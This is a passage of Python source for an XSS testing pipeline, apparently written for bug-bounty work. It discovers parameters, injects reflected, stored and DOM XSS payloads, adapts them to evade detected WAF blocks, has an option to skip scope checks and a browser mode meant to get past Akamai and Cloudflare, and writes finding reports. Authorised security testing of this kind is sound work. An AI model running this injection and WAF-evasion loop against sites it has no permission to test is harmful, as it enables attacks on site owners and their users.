            discovered_params = self.discovery.run(self.target)
            params = [p for p in discovered_params if self.validate_target(p.url)]
            if len(params) != len(discovered_params):
                print(f"[+] {len(params)} params in scope (filtered from {len(discovered_params)} total)")
            print(f"  Found {len(params)} parameters: {[p.name for p in params[:20]]}")
        else:
            params = []

        # Phase 2: Screening
        if self.mode in ("full", "reflected") and params:
            print("\n[Phase 2] Screening for reflection...")
            candidates = self.screener.screen(self.target, params)
            high = [c for c in candidates if c.priority == "HIGH"]
            med = [c for c in candidates if c.priority == "MED"]
            print(f"  HIGH priority: {len(high)}, MED: {len(med)}")
        else:
            candidates = []

        # Phase 3A: Reflected XSS
        if self.mode in ("full", "reflected"):
            print("\n[Phase 3A] Testing Reflected XSS...")
            for candidate in candidates:
                self._log(f"  Testing param: {candidate.param} (ctx={candidate.context})")
                new_findings = self.reflected_tester.test(self.target, candidate)

                if not new_findings and candidate.priority == "HIGH":
                    new_findings = self._adaptive_bypass(candidate)

                if new_findings:
                    print(f"  [FOUND] {candidate.param} — {new_findings[0].payload[:60]}")
                    self.findings.extend(new_findings)

        # Phase 3B: Stored XSS
        if self.mode in ("full", "stored") and self.stored_urls:
            print("\n[Phase 3B] Testing Stored XSS...")
            for candidate in (candidates or self.screener.screen(self.target, self.discovery.run(self.target))):
                self._log(f"  Testing stored param: {candidate.param}")
                new_findings = self.stored_tester.test(
                    submit_url=self.target,
                    render_urls=self.stored_urls,
                    param=candidate.param,
                )
                if new_findings:
                    print(f"  [FOUND STORED] {candidate.param}")
                    self.findings.extend(new_findings)

        # Phase 3C: DOM XSS
        if self.mode in ("full", "dom"):
            print("\n[Phase 3C] Analyzing DOM XSS...")
            dom_findings = self.dom_tester.analyze(self.target)
            if dom_findings:
                print(f"  Found {len(dom_findings)} source-to-sink chains")
                self.findings.extend(dom_findings)

        # Phase 5: Browser verification (optional)
        if self.browser_verify and self.findings:
            print("\n[Phase 5] Browser verification...")
            for finding in self.findings:
                if not finding.confirmed:
                    finding.confirmed = verify_with_browser(finding)
                    if finding.confirmed:
                        finding.severity = "P1"
                        print(f"  [CONFIRMED] {finding.poc[:80]}")

        self.findings = self._dedupe(self.findings)
        self._save_report()
        self._print_summary()

        return self.findings

    def _adaptive_bypass(self, candidate: ScreenResult) -> list[XSSFinding]:
        """Try adaptive bypass for high-priority candidates."""
        findings: list[XSSFinding] = []

        for base_payload in REFLECTED_PAYLOADS["standard"]:
            url = _inject_param(self.target, candidate.param, base_payload)
            try:
                resp = self.session.get(url, timeout=12)
            except Exception:
                continue

            block_type = self.bypass_engine.detect_block_type(resp.text, resp.status_code)
            if block_type == "NO_BLOCK":
                continue

            self._log(f"    WAF block type: {block_type}, trying bypass variants...")
            variants = self.bypass_engine.adapt(base_payload, block_type)

            for variant in variants:
                url = _inject_param(self.target, candidate.param, variant)
                try:
                    resp = self.session.get(url, timeout=12)
                    time.sleep(1.0 / max(self.rate_limit, 0.1))
                except Exception:
                    continue

                body = resp.text
                if variant in body and _looks_executable(variant, body) and not _is_blocked(resp.status_code, body):
                    findings.append(XSSFinding(
                        type="reflected",
                        url=url,
                        param=candidate.param,
                        payload=variant,
                        context=candidate.context,
                        sink="reflection",
                        poc=url,
                        severity="P2",
                        bypass_tier=f"bypass:{block_type}",
                        evidence=_snippet(body, variant),
                    ))
                    return findings

        return findings

    def _dedupe(self, findings: list[XSSFinding]) -> list[XSSFinding]:
        seen: set[str] = set()
        unique = []
        for f in findings:
            key = hashlib.md5(f"{f.param}:{f.payload}:{f.type}".encode()).hexdigest()
            if key not in seen:
                seen.add(key)
                unique.append(f)
        return unique

    def _save_report(self) -> None:
        ts = datetime.now(timezone.utc).strftime("%Y%m%dT%H%M%SZ")
        out_dir = Path.home() / "Shared" / "bounty_recon" / self.program / "ghost" / "xss_framework"
        out_dir.mkdir(parents=True, exist_ok=True)

        # JSON
        report = {
            "target": self.target,
            "program": self.program,
            "mode": self.mode,
            "timestamp": ts,
            "total_findings": len(self.findings),
            "confirmed_count": sum(1 for f in self.findings if f.confirmed),
            "findings": [asdict(f) for f in self.findings],
        }
        json_path = out_dir / f"xss_framework_{ts}.json"
        json_path.write_text(json.dumps(report, indent=2), encoding="utf-8")

        # Markdown
        lines = [
            f"# XSS Framework — {self.target}",
            f"",
            f"- **Program**: {self.program}",
            f"- **Mode**: {self.mode}",
            f"- **Timestamp**: {ts}",
            f"- **Findings**: {len(self.findings)} ({sum(1 for f in self.findings if f.confirmed)} confirmed)",
            f"",
        ]
        for f in self.findings:
            confirmed_tag = " ✓ CONFIRMED" if f.confirmed else ""
            lines += [
                f"## [{f.severity}] {f.type.upper()}{confirmed_tag} — `{f.param}`",
                f"- **Type**: {f.type}",
                f"- **Context**: {f.context}",
                f"- **Sink**: {f.sink}",
                f"- **Bypass Tier**: {f.bypass_tier}",
                f"- **Payload**: `{f.payload}`",
                f"- **PoC**: `{f.poc}`",
                f"- **Evidence**: `{f.evidence[:200]}`",
                f"",
            ]

        md_path = out_dir / f"xss_framework_{ts}.md"
        md_path.write_text("\n".join(lines), encoding="utf-8")
        print(f"\n[+] Report saved: {json_path}")

    def _print_summary(self) -> None:
        print("\n" + "=" * 60)
        print("  XSS FRAMEWORK RESULTS")
        print("=" * 60)
        print(f"  Target  : {self.target}")
        print(f"  Total   : {len(self.findings)}")
        print(f"  P1      : {sum(1 for f in self.findings if f.severity == 'P1')}")
        print(f"  P2      : {sum(1 for f in self.findings if f.severity == 'P2')}")
        print(f"  Confirmed (browser): {sum(1 for f in self.findings if f.confirmed)}")
        print("=" * 60)
        for f in self.findings:
            tag = "[CONFIRMED]" if f.confirmed else f"[{f.severity}]"
            print(f"  {tag} {f.type:10s} {f.param:20s} {f.payload[:50]}")

    def _get(self, url: str, **kwargs):
        """GET using browser-bypass session if enabled, else plain httpx."""
        return self.session.get(url, **kwargs)

    def _post(self, url: str, **kwargs):
        """POST using browser-bypass session if enabled, else plain httpx."""
        return self.session.post(url, **kwargs)

    def _log(self, msg: str) -> None:
        if self.verbose:
            print(msg)

    def close(self) -> None:
        self.session.close()


# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------

WAF_BLOCK_CODES = {403, 406, 429, 503}
WAF_BODY_SIGS = [
    "access denied", "blocked", "cloudflare", "sucuri", "incapsula",
    "mod_security", "request rejected", "illegal request",
    "web application firewall", "reference #",
]

EXECUTABLE_TOKENS = [
    "<script", "onerror=", "onload=", "onfocus=", "ontoggle=", "onbegin=",
    "onstart=", "onanimation", "onpointer", "javascript:", "eval(",
    "alert(", "confirm(", "prompt(", "<svg", "<img", "<iframe", "<details",
]


def _is_blocked(status_code: int, body: str) -> bool:
    if status_code in WAF_BLOCK_CODES:
        return True
    lowered = body.lower()
    return any(sig in lowered for sig in WAF_BODY_SIGS)


def _looks_executable(payload: str, body: str) -> bool:
    lowered = html.unescape(body).lower()
    payload_lower = payload.lower()
    return any(
        token in payload_lower and token in lowered
        for token in EXECUTABLE_TOKENS
    )


def _inject_param(base_url: str, param: str, value: str) -> str:
    parsed = urlparse(base_url)
    existing = parse_qs(parsed.query, keep_blank_values=True)
    existing[param] = [value]
    new_query = urlencode({k: v[0] for k, v in existing.items()})
    return parsed._replace(query=new_query).geturl()


def _strip_query(url: str) -> str:
    split = urlsplit(url)
    return urlunsplit((split.scheme, split.netloc, split.path, "", ""))


def _snippet(body: str, marker: str, radius: int = 100) -> str:
    idx = body.find(marker)
    if idx == -1:
        idx = html.unescape(body).find(marker)
    if idx == -1:
        return body[:200].replace("\n", " ")
    start = max(0, idx - radius)
    end = min(len(body), idx + len(marker) + radius)
    return body[start:end].replace("\n", " ").strip()


def _empty_result(url: str, error: str = "") -> dict:
    return {
        "url": url,
        "blocked": False,
        "reflected_intact": False,
        "executed": False,
        "evidence": error,
        "status": 0,
    }


# ---------------------------------------------------------------------------
# CLI
# ---------------------------------------------------------------------------

def main() -> int:
    parser = argparse.ArgumentParser(
        description="XSS Framework — Integrated multi-phase XSS testing pipeline.",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Modes:
  full       All phases: discovery → screen → reflected + stored + DOM
  reflected  Parameter discovery → screen → reflected XSS only
  dom        DOM source-to-sink analysis only
  stored     Parameter discovery → screen → stored XSS (requires --stored-url)
  discover   Parameter discovery only (print found params, no testing)
  screen     Discovery + reflection screening only

Examples:
  python3 xss_framework.py --target "https://target.com/search?q=test" --program myprog
  python3 xss_framework.py --target "https://target.com" --mode dom
  python3 xss_framework.py --target "https://target.com/post" --mode stored \\
      --stored-url "https://target.com/forum/thread/1" --program myprog
  python3 xss_framework.py --target "https://target.com" --mode full \\
      --browser-verify --rate 1 --verbose
        """,
    )
    parser.add_argument("--target", required=True, help="Target URL")
    parser.add_argument("--program", default="adhoc", help="Bug bounty program name")
    parser.add_argument(
        "--mode",
        choices=["full", "reflected", "dom", "stored", "discover", "screen"],
        default="full",
        help="Testing mode (default: full)",
    )
    parser.add_argument(
        "--stored-url",
        dest="stored_urls",
        nargs="+",
        metavar="URL",
        help="URLs where stored XSS would render (for stored mode)",
    )
    parser.add_argument("--rate", type=float, default=2.0, help="Requests per second (default: 2.0)")
    parser.add_argument("--browser-verify", action="store_true", help="Browser-verify findings with Playwright")
    parser.add_argument(
        "--browser-bypass",
        action="store_true",
        help="Use browser automation when WAF blocks (auto-bypass Akamai, Cloudflare, etc.)",
    )
    parser.add_argument("--output", help="Output JSON file path")
    parser.add_argument("--verbose", "-v", action="store_true", help="Verbose output")
    parser.add_argument("--skip-scope", action="store_true", help="Skip scope validation")

    args = parser.parse_args()

    framework = XSSFramework(
        target=args.target,
        program=args.program,
        rate_limit=args.rate,
        mode=args.mode,
        stored_urls=args.stored_urls or [],
        browser_verify=args.browser_verify,
        verbose=args.verbose,
        skip_scope=args.skip_scope,
        use_browser_bypass=args.browser_bypass,
    )

    try:
        # Handle info-only modes
        if args.mode == "discover":
            params = framework.discovery.run(framework.target)
            print(f"[+] Discovered {len(params)} parameters:")
            for p in params:
                print(f"  [{p.source:8s}] {p.name} (priority={p.priority})")
            framework.close()
            return 0

        if args.mode == "screen":
            params = framework.discovery.run(framework.target)
            candidates = framework.screener.screen(framework.target, params)
            print(f"\n[+] Screen results ({len(candidates)} reflective params):")
            for c in candidates:
                print(f"  [{c.priority}] {c.param} ctx={c.context} near_sink={c.near_sink}")
            framework.close()
            return 0

        findings = framework.run()

        if args.output:
            data = [asdict(f) for f in findings]
            Path(args.output).write_text(json.dumps(data, indent=2), encoding="utf-8")
            print(f"[+] Results saved: {args.output}")

        return 0 if findings else 1

    except KeyboardInterrupt:
        print("\n[!] Interrupted.")
        return 130
    finally:
        framework.close()


if __name__ == "__main__":
    sys.exit(main())
